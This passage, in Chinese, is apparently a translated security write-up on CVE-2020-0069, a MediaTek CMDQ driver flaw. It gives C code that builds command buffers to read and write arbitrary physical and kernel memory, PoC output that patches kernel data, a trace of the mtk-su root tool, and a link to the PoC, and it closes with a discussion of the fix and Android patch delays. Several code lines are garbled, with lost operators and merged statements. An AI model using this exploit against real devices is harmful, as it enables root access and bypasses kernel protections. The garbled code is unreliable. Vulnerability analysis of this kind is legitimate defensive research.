        CMDQ_DATA_REG_2D_SHARPNESS_1 = 0x0a,    /* R10 */
        CMDQ_DATA_REG_2D_SHARPNESS_1_DST = 0x16,    /* P6 */
        CMDQ_DATA_REG_DEBUG = 0x0b, /* R11 */
        CMDQ_DATA_REG_DEBUG_DST = 0x17, /* P7 */
## 开始玩转驱动程序
现在我们理解了一点这个驱动程序的工作原理，让我们用它来实现基本的内存读写。
## 写内存
为了在内存中写一个 32 比特的值，我们可以使用以下命令:
  * MOVE 一个 32 比特的值到 value 寄存器
  * MOVE 一个我们想要放数据的位置的地址到 address 寄存器中
  * WRITE value 寄存器中的值到 address 寄存器指向的地址中
    // move value into CMDQ_DATA_REG_DEBUG
    *(uint32_t*)(command->pVABase + command->blockSize) = value;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_MOVE > 0x20;
    command->blockSize += 8;
    // move pa_address into CMDQ_DATA_REG_DEBUG_DST
    *(uint32_t*)(command->pVABase + command->blockSize) = (uint32_t)pa_address;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_MOVE > 0x20;
    command->blockSize += 8;
    //write CMDQ_DATA_REG_DEBUG into CMDQ_DATA_REG_DEBUG_DST
    *(uint32_t*)(command->pVABase + command->blockSize) = CMDQ_DATA_REG_DEBUG;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_WRITE blockSize += 8;
## 读内存
在内存中读取一个 32 比特的值可以用四条命令实现:
  * MOVE 需要被读取的地址 ( pa_address ) 到 address 寄存器
  * READ address 寄存器指向的地址并将结果存放在 value 寄存器中
  * MOVE DMA 缓冲区地址 ( dma_address ) 到 address 寄存器
  * WRITE value 寄存器中的值到 address 寄存器指向的地址中
我们需要将这些命令预先放置在一个已经分配好的缓冲区中并将地址写入在结构体 cmdqCommandStruct 中的 pVABase
字段。命令缓冲区的大小必须放在 blockSize 字段中。
    // move pa_address into CMDQ_DATA_REG_DEBUG_DST
    *(uint32_t*)(command->pVABase + command->blockSize) = (uint32_t)pa_address;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_MOVE > 0x20;
    command->blockSize += 8;
    // read value at CMDQ_DATA_REG_DEBUG_DST into CMDQ_DATA_REG_DEBUG
    *(uint32_t*)(command->pVABase + command->blockSize) = CMDQ_DATA_REG_DEBUG;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_READ blockSize += 8;
    // move dma_address into CMDQ_DATA_REG_DEBUG_DST
    *(uint32_t*)(command->pVABase + command->blockSize) = (uint32_t)dma_address;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_MOVE > 0x20;
    command->blockSize += 8;
    //write CMDQ_DATA_REG_DEBUG into CMDQ_DATA_REG_DEBUG_DST
    *(uint32_t*)(command->pVABase + command->blockSize) = CMDQ_DATA_REG_DEBUG;
    *(uint32_t*)(command->pVABase + command->blockSize + 4) = CMDQ_CODE_WRITE readAddress.dmaAddresses) = dma_address;
    command->readAddress.count = offset;
结果将会被写入到之前分配好的 readAddress.values 中
## 简易的 PoC
要标识内核使用的物理地址，一个可以使用的设备是 /proc/iomem ( 需要 root 权限 )
    # cat /proc/iomem
    [...]
    40000000-545fffff : System RAM
      40008000-415fffff : Kernel code
      41800000-41d669b3 : Kernel data
    [...]
这些地址是静态配置的，并且在每次引导时保持不变
这个 PoC 由两个程序组成:
  * 一个 C 程序允许基础的内存读写
  * 一个 shell 脚本，调用前面的程序来搜索内核数据内存中第一个出现的 “Linux” 字符串，然后将其替换为 “minix”
    $ uname -a
    Linux localhost 4.9.77+ #1 SMP PREEMPT Mon Jan 21 18:32:19 WIB 2019 armv7l
    $ sh poc.sh
    [+] Found Linux string at 0x4180bc00
    [+] Found Linux string at 0x4180bea0
    [+] Write the patched value
    $ uname -a
    minix  4.9.77+ #1 SMP PREEMPT Mon Jan 21 18:32:19 WIB 2019 armv7l
非常有用…
我们已经实现了读写内核内存数据。我们可以对任何其他内存区域做同样的事情，绕过系统中设置的权限和保护。所以除了玩一些小把戏，通过这个漏洞修改系统内存中的任何一个部分例如内核代码和数据以便实现提权。
二进制工具 mtk-su 通过该漏洞执行了很多有趣的操作，从而达到 root 权限。在这篇文章中我们不打算详细介绍 mtk-su
使用的这些内核利用方法。然而那些想要了解更多的人，可以看看我们制作的小型跟踪库。它会在启动 mtk-su 时进行预加载，并且它将跟踪 CMDQ
驱动程序的一些 IOCTL 调用，例如发送给驱动程序的命令。
    $ mkdir mtk-su
    $ LD_PRELOAD=./syscall-hook.so ./mtk-su
    alloc failed
    alloc count=400 startPA=0x5a733000
    uncatched ioctl 40e07803
    exec command (num 0) ( blockSize=8040, readAddress.count=0 ) dumped into cmd-0
    exec command (num 1) ( blockSize=3e0, readAddress.count=1e ) dumped into cmd-1
    [...]
    $ cat mtk-su/cmd-1
    WFE to_wait=1, wait=1, to_update=1, update=0, event=1da
    MOVE 40928000 into reg 17
    READ  address reg 17, data reg b
    [...]
PoC和跟踪程序库可以在 Quarkslab 的存储库中找到
[CVE-2020-0069_poc](https://github.com/quarkslab/CVE-2020-0069_poc)
## 总结
这个漏洞非常的危险。它基本上允许任何应用程序读写所有的系统内存，包括内核内存。我们可能想要知道为什么这个设备驱动程序需要被每一个应用程序访问，而不仅仅是开放给硬件抽象层(
Hardware Abstraction Layer ) 和与媒体相关的进程。它至少需要添加一个额外的步骤来从一个没有特权的应用程序获得 root 权限。
根据 Fire HD 8 Linux
内核的源代码。通过解析来自命令缓冲区的所有命令并验证每个命令以及使用的地址和寄存器，这个问题得到了解决。举个例子，只有来自于 DMA
缓冲区的地址被允许移动到一个 address 寄存器中。
因为我们不是发现这个漏洞的人，我们无法通知给联发科这个问题。但从技术角度来看，没有什么能让这个漏洞需要这么长时间才修复。根据 XDA 开发者的文章，联发科自
2019 年 5 月份进行了修复，但它花了 10 个月的时间才在终端用户设备上广泛修补。感谢有了 Android 许可协议，谷歌已经能够迫使 OEM
更新他们的设备。这是 Android 生态系统中补丁管理复杂性的一个很好的例子，许多参与者 ( SoC 制造商、OEM、ODM )
必须一起行动，以修复终端用户设备上的漏洞。最后，似乎只有法律方面才能迫使所有这些参与者集成修复程序。
我们现在可能想知道，是否所有嵌入联发科 SoC 并集成 AOSP OS 版本且没有 Android
许可协议的设备都能从这个补丁中受益，而它们的供应商没有法律义务去集成它。
## 引用
[[1]
https://source.android.com/security/bulletin/2020-03-01](https://source.android.com/security/bulletin/2020-03-01)
[[2] https://forum.xda-developers.com/android/development/amazing-temp-root-mediatek-armv8-t3922213](https://forum.xda-developers.com/android/development/amazing-temp-root-mediatek-armv8-t3922213)
[[3] https://www.xda-developers.com/files/2020/03/CVE-2020-0069.png](https://www.xda-developers.com/files/2020/03/CVE-2020-0069.png)
[[4] https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/cactus-p-oss](https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/cactus-p-oss)
[[5]
https://www.amazon.com/gp/help/customer/display.html?tag=androidpolice-20&nodeId=200203720](https://www.amazon.com/gp/help/customer/display.html?tag=androidpolice-20&nodeId=200203720)
[[6] https://www.xda-developers.com/mediatek-su-rootkit-exploit/](https://www.xda-developers.com/mediatek-su-rootkit-exploit/)